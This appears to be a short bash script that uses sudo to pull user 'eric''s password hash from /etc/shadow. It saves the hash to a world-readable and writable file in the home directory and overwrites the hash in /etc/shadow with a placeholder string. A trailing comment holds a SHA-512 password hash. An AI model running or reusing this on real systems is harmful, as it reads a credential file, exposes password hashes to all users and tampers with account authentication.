#!/bin/bash
user="eric"
placeholder="ZZZZZZZZZZAAAAAAAAAAAAAAAAAAAAAYYYYYYYYYYYYYYYYYYYYYYYYY"
h=$(runAt.sh HOME)
pwd=$(sudo grep -roP "eric:.*" /etc/shadow | sed -E "s/eric:([^:]*):.*$/\1/")
echo $pwd : $h
userFile=$h/.${user}HashPwd
touch $userFile
chmod 0777 $userFile
if [ "$pwd" != "$placeholder" ]
then
	echo here
	echo "$pwd" > $userFile
	sudo sed -i "s/$pwd/$placeholder/" /etc/shadow
fi

#$6$J1l4qI5N$QZaKxgdD9AUqgXSrR29hUEW3.8lJ4NIGHUAGcICM40mUx9RczjIRtUesjDt28OBLWVTyxQ7YZ3XWWzrLcRfDS0